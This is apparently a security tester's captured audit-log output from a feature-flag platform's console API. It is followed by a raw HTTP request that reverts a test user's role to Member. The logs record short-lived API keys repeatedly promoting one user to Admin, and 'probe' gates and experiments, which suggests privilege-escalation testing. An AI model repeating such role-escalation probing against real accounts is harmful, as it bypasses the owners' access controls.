Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"HbI8MLhu08H7azweE0eQd","name":"CONSOLE API - console-v0LnSZL***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"13:46:01 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"38orfimlTFHnty9wOunjf2","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"13:41:06 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-v0LnSZL***************","updatedByUserID":"2QS4pPJCbwsNAw25oSebn1","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"31HJLpfldZXHurQMY9l0UV","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"13:41:00 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-v0LnSZL***************","updatedByUserID":"2QS4pPJCbwsNAw25oSebn1","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"30iMrawZxctGAD4bGrDJV7","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"13:40:58 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-v0LnSZL***************","updatedByUserID":"2QS4pPJCbwsNAw25oSebn1","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"30iI77eObi0v2nNSqgWrfo","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"13:40:58 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-v0LnSZL***************","updatedByUserID":"2QS4pPJCbwsNAw25oSebn1","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"2ZOrK3XkNZxE9EDT0HOoh4","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"13:40:58 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-v0LnSZL***************","updatedByUserID":"2QS4pPJCbwsNAw25oSebn1","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"2ZIAzBjX7tY8vLAZg0GPiV","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"13:40:58 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-v0LnSZL***************","updatedByUserID":"2QS4pPJCbwsNAw25oSebn1","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"2ZGQugZnhIbQKaxsF5i5Xn","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"13:40:58 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-v0LnSZL***************","updatedByUserID":"2QS4pPJCbwsNAw25oSebn1","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"2QYYr2rFg6NxBsFAS6WuWr","name":"CONSOLE API - console-v0LnSZL***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"13:40:50 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"4vqMwUwvLxpmeLi0aHxYEx","name":"CONSOLE API - console-h46kKOB***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"13:35:12 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"4r8KCgFUxK5TZFI34iOP1l","name":"CONSOLE API - console-LJ6v8CO***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"13:35:08 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"4alqJ4bodoTwG9wDxMulDG","name":"Member","changeLog":"Updated role permissions","actionType":"upsert_user_role","date":"Sat Oct 17 2026","time":"13:34:53 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3UrpjZg58li8TSZONMItYa","name":"Member","changeLog":"Updated role permissions","actionType":"upsert_user_role","date":"Sat Oct 17 2026","time":"13:34:39 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3ch35DK2qqq6tcUSq0diI3","name":"r1_t4_at_b","changeLog":"Deleted Autotune Experiment","actionType":"autotune_experiment_delete","date":"Sat Oct 17 2026","time":"13:26:50 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2TMv8jmegWsokeE4QgEID5","name":"r1_t4_at_b","changeLog":"Started Experiment","actionType":"experiment_start","date":"Sat Oct 17 2026","time":"13:26:34 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"2TMv8hHbOEiU0P69f8J5k3","name":"r1_t4_at_b","changeLog":"Committed Autotune Review","actionType":"apply_autotune_review","date":"Sat Oct 17 2026","time":"13:26:34 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"2rhXuGNgA1Do0eGCGcUBzR","name":"r1_t4_at_b","changeLog":"Requested to start autotune","actionType":"autotune_review_create","date":"Sat Oct 17 2026","time":"13:26:08 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2mAGuOMnqvM78p5MOdQZxf","name":"r1_t4_at_b","changeLog":"Created Autotune Experiment","actionType":"autotune_experiment_create","date":"Sat Oct 17 2026","time":"13:26:04 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"20DdHJc7bhwnoJBRyMjNwk","name":"CONSOLE API - console-LJ6v8CO***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"13:25:45 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"1LtqJRIdp6gNVQnidovWkf","name":"r1_t4_autotune_probe3","changeLog":"Deleted Autotune Experiment","actionType":"autotune_experiment_delete","date":"Sat Oct 17 2026","time":"13:25:31 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1xnKomfUEnDuxvKj9sxPOm","name":"r1_t4_autotune_probe3","changeLog":"Created Autotune Experiment","actionType":"autotune_experiment_create","date":"Sat Oct 17 2026","time":"13:25:19 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1mdRfkn0dbcWidQGK20iUj","name":"r1_t4_autotune_probe2","changeLog":"Deleted Autotune Experiment","actionType":"autotune_experiment_delete","date":"Sat Oct 17 2026","time":"13:25:09 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1c5z4JX64ErbpLGVhOwujP","name":"r1_t4_autotune_probe2","changeLog":"Created Autotune Experiment","actionType":"autotune_experiment_create","date":"Sat Oct 17 2026","time":"13:25:00 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"TT4T8RFZMlbXe27a3ZZ3f","name":"r1_t4_autotune_probe","changeLog":"Deleted Autotune Experiment","actionType":"autotune_experiment_delete","date":"Sat Oct 17 2026","time":"13:24:43 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"JjAzQ4m21PNTIoSo1ftuo","name":"r1_t4_autotune_probe","changeLog":"Created Autotune Experiment","actionType":"autotune_experiment_create","date":"Sat Oct 17 2026","time":"13:24:34 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-h46kKOB***************","updatedByUserID":"6zZuntrwMUVN0B3LRaiUyA","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"6A2Ue4Ov6y12QdIo0qGMN2","name":"CONSOLE API - console-h46kKOB***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"13:22:47 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"4g2tAfLQXIGiuWgXtNkxR6","name":"CONSOLE API - console-A10BgEx***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"12:37:42 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"4bW1mqBEp7zBxUdyIJv17f","name":"CONSOLE API - console-4u6zFAH***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"12:37:38 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"43xfVKq7d5gzNYBcJLSCs1","name":"parity_probe_gate","changeLog":"Deleted Config","actionType":"config_delete","date":"Sat Oct 17 2026","time":"12:37:31 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-4u6zFAH***************","updatedByUserID":"3rMk8B8NyHQF6sJKqzXkhq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"41C9v1vlBoB8Axg1AwgRsE","name":"parity_probe_gate","changeLog":"Created Gate","actionType":"gate_create","date":"Sat Oct 17 2026","time":"12:37:29 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-4u6zFAH***************","updatedByUserID":"3rMk8B8NyHQF6sJKqzXkhq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"3WiwBWbK4VCLSxTdShxrge","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"12:37:24 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-4u6zFAH***************","updatedByUserID":"3rMk8B8NyHQF6sJKqzXkhq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"3SeZYllemAiTrdykD2r4QV","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"12:37:21 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-4u6zFAH***************","updatedByUserID":"3rMk8B8NyHQF6sJKqzXkhq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"3Lu2Ldl38lPvacWIfxxrYV","name":"CONSOLE API - console-A10BgEx***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"12:37:15 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3rPOjfNXefp7UBOuWO92es","name":"CONSOLE API - console-4u6zFAH***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"12:36:57 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2T61sbP04LUDdvlQbgiOia","name":"CONSOLE API - console-H1pVPSw***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"12:29:17 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2zFo4AtC5hm4qN7z3qwFTL","name":"CONSOLE API - console-H1pVPSw***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"12:29:00 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7w5s9zVn3mOSkbgpso7hom","name":"AmpHuntProject","changeLog":"Updated precommit webhook configuration","actionType":"update_precommit_webhook_key","date":"Sat Oct 17 2026","time":"11:57:45 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7srJbDAC61Opma7XSBwtkD","name":"AmpHuntProject","changeLog":"Updated precommit webhook configuration","actionType":"update_precommit_webhook_key","date":"Sat Oct 17 2026","time":"11:57:41 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"5qRdwrN8HxSi5AFClos5SX","name":"CONSOLE API - console-ihS8sI8***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"11:55:50 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3sE78LHzzgHKQUrMIdd5tt","name":"CONSOLE API - console-ihS8sI8***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"11:54:01 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"fP8EwfHxqNTnsfjHAdHMS","name":"CONSOLE API - console-aircRwa***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"11:43:55 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"8CDGppbIqeMzm4kMtGAve","name":"CONSOLE API - console-JNyyTYy***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sat Oct 17 2026","time":"11:43:48 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7HlN2An3iLXqkyeWQ4htFe","name":"escv2_probe_gate","changeLog":"Deleted Config","actionType":"config_delete","date":"Sat Oct 17 2026","time":"11:43:36 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7GV0QbKJB133tKn6BFD9yg","name":"escv2_probe_gate","changeLog":"Cancelled Config Review","actionType":"config_review_delete","date":"Sat Oct 17 2026","time":"11:43:35 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7CyNwmj9azt2Dl6mJrA2BT","name":"CONSOLE API - console-JNyyTYy***************Key","changeLog":"Updated SDK Key Scopes","actionType":"sdk_key_update_scopes","date":"Sat Oct 17 2026","time":"11:43:31 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"7pHBZ7zJ61EqKY04QzbJHg","name":"CONSOLE API - console-JNyyTYy***************Key","changeLog":"Updated SDK Key Scopes","actionType":"sdk_key_update_scopes","date":"Sat Oct 17 2026","time":"11:43:20 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"6ALcxhdHx3jSMjI6bEO2tn","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"11:42:35 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-JNyyTYy***************","updatedByUserID":"5ZcgngnSFkVV7jg7jUx0UU","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"6wPu7DdHoILoZiuCXXIuJl","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Admin","actionType":"batch_user_role_update","date":"Sat Oct 17 2026","time":"11:42:31 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-JNyyTYy***************","updatedByUserID":"5ZcgngnSFkVV7jg7jUx0UU","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"6luVuwMQNKyIPnLkNva2ID","name":"escv2_probe_gate","changeLog":"Updated config from In Progress to Disabled.","actionType":"config_state_toggle","date":"Sat Oct 17 2026","time":"11:42:21 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-JNyyTYy***************","updatedByUserID":"5ZcgngnSFkVV7jg7jUx0UU","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"6luVutsLTafKcyFtBfiM6z","name":"escv2_probe_gate","changeLog":"Committed Config Review","actionType":"config_review_commit","date":"Sat Oct 17 2026","time":"11:42:21 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-JNyyTYy***************","updatedByUserID":"5ZcgngnSFkVV7jg7jUx0UU","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"6hFH9NoQ4PFenWbY5MOJA4","name":"escv2_probe_gate","changeLog":"Created Config Review","actionType":"config_review_create","date":"Sat Oct 17 2026","time":"11:42:18 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"6dtwpCbCxxVomgyz95QLdh","name":"escv2_probe_gate","changeLog":"Created Gate","actionType":"gate_create","date":"Sat Oct 17 2026","time":"11:42:14 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter via CONSOLE API","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"60B0JldGip0hhJDuvUk5mT","name":"CONSOLE API - console-aircRwa***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"11:42:03 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"5ZgeOi6jOfMQL7hOqTlyU0","name":"CONSOLE API - console-JNyyTYy***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sat Oct 17 2026","time":"11:42:01 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3EC3YUxr6UOJPlTG3oZDLP","name":"Databricks Hybrid Integration 1","changeLog":"Deleted Integration","actionType":"integration_delete","date":"Wed Sep 23 2026","time":"02:21:22 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3kJbBNpSZxsr1ZcLrGdn61","name":"Databricks Hybrid Integration 1","changeLog":"Set up source","actionType":"integration_upsert","date":"Wed Sep 23 2026","time":"02:21:04 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3BKFHF6TGGoCe40cTeflKu","name":"CONSOLE API - console-1JJG8Jq***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sun Sep 20 2026","time":"16:36:43 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"3lNA4fhx3y3X6xqGuaZTmQ","name":"CONSOLE API - console-1JJG8Jq***************Key","changeLog":"Created SDK Key","actionType":"sdk_key_create","date":"Sun Sep 20 2026","time":"16:36:29 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"2AlTRuqDRpXY98E20Z8z26","name":"CONSOLE API - console-48Ys4V5***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sun Sep 20 2026","time":"16:35:46 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"1qE56ZBRONRuNxbqxIR3WJ","name":"CONSOLE API - console-rqMcnK5***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sun Sep 20 2026","time":"16:34:43 GMT+0000 (Coordinated Universal Time)","updatedBy":"Amina Hunter","updatedByUserID":"nZ2wI4FMJek95vjJHdnWR","modifierEmail":"mohamed-9499-2@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"1lQsGhUjvp8dDz2q2oClxU","name":"AmpHuntProject","changeLog":"Updated Bruno Hunter roles to Member","actionType":"batch_user_role_update","date":"Sun Sep 20 2026","time":"16:34:38 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-rqMcnK5***************","updatedByUserID":"3onjTvE0A598I6TSQW9mnq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"1jHyd2VhVnbijFIc1rnEDx","name":"AmpHuntProject","changeLog":"Updated Sam Tester roles to Member","actionType":"batch_user_role_update","date":"Sun Sep 20 2026","time":"16:34:37 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-rqMcnK5***************","updatedByUserID":"3onjTvE0A598I6TSQW9mnq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"oxRLJdwP5VphLv3XJJKGY","name":"CONSOLE API - console-MHbPD99***************Key","changeLog":"Deleted SDK Key","actionType":"sdk_key_delete","date":"Sun Sep 20 2026","time":"16:33:46 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-rqMcnK5***************","updatedByUserID":"3onjTvE0A598I6TSQW9mnq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"ktqVryDvUtL84k5K2UF5k","name":"CONSOLE API - console-rqMcnK5***************Key","changeLog":"Updated SDK Key Scopes","actionType":"sdk_key_update_scopes","date":"Sun Sep 20 2026","time":"16:33:42 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"bZ5CvUs30u4qXIsAx3ejb","name":"CONSOLE API - console-rqMcnK5***************Key","changeLog":"Updated SDK Key Scopes","actionType":"sdk_key_update_scopes","date":"Sun Sep 20 2026","time":"16:33:35 GMT+0000 (Coordinated Universal Time)","updatedBy":"Bruno Hunter","updatedByUserID":"13B13WHITpDKkMpbi22BGW","modifierEmail":"mohamed-9499-3@agentmail.to","changes":{},"tags":[],"targetAppIDs":[]},{"id":"6H0NnQ9oKxRRGhTwpYuqSu","name":"mta_unit_id","changeLog":"Deleted Company ID Type","actionType":"company_ID_type_delete","date":"Sun Sep 20 2026","time":"16:32:23 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-rqMcnK5***************","updatedByUserID":"3onjTvE0A598I6TSQW9mnq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"6Fbl9pZsLDmlru3RMBKdZM","name":"AmpHuntProject","changeLog":"Delete User Role with name mta_probe_role","actionType":"delete_user_role","date":"Sun Sep 20 2026","time":"16:32:22 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-rqMcnK5***************","updatedByUserID":"3onjTvE0A598I6TSQW9mnq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"5QL0u2cIdVTxigzfiBuruI","name":"AmpHuntProject","changeLog":"Updated Active User Definition","actionType":"active_user_definition_update","date":"Sun Sep 20 2026","time":"16:31:37 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-rqMcnK5***************","updatedByUserID":"3onjTvE0A598I6TSQW9mnq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]},{"id":"5QL0u0xFLDK2YR1jHtyObG","name":"AmpHuntProject","changeLog":"Added Company ID Type","actionType":"company_ID_type_add","date":"Sun Sep 20 2026","time":"16:31:37 GMT+0000 (Coordinated Universal Time)","updatedBy":"CONSOLE API - console-rqMcnK5***************","updatedByUserID":"3onjTvE0A598I6TSQW9mnq","modifierEmail":null,"changes":{},"tags":[],"targetAppIDs":[]}],"pagination":{"itemsPerPage":100,"pageNumber":1,"totalItems":803,"nextPage":"/console/v1/audit_logs?startDate=2026-07-21&endDate=2026-10-19&page=2&limit=100","previousPage":null,"all":"/console/v1/audit_logs"}}
+══════════════════════════ r3_11_revert.txt ══════════════════════════
+POST /console/v1/users/mohamed-9499-3@agentmail.to HTTP/1.1
+Host: statsigapi.net
+STATSIG-API-KEY: console-TVZa...3aXU
+Accept: application/json
+Content-Type: application/json
+
+{"role": "Member"}
+
+===== RESPONSE =====
+HTTP/1.1 201
+access-control-allow-origin: *
+content-type: application/json; charset=utf-8
